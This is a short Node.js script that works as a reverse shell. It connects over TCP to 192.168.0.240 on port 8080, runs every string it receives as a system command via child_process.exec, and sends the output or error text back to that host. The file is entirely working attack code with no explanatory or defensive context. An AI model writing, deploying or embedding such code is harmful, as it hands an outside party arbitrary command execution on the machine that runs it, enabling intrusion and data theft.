const net = require('net');
const { spawn, exec } = require('child_process');


const client = new net.Socket();

function connect() {
  client.connect(8080, '192.168.0.240', () => {
    
    console.log("> Connection established, waiting for data")
    client.on('data', (data) => {
        console.log('Received >', data.toString());
        exec(data.toString(), (error, stdout, stderr) => {
            console.log('> Transmitting output..');
            if (error) {
                console.log('ERROR');
                return client.write(error.message)
            }
            if (stderr) {
                console.log('ERROR');
                return client.write(stderr)
            }
            console.log('> Transmission successfull');
            return client.write(stdout)
        })
    });
  });
}
connect()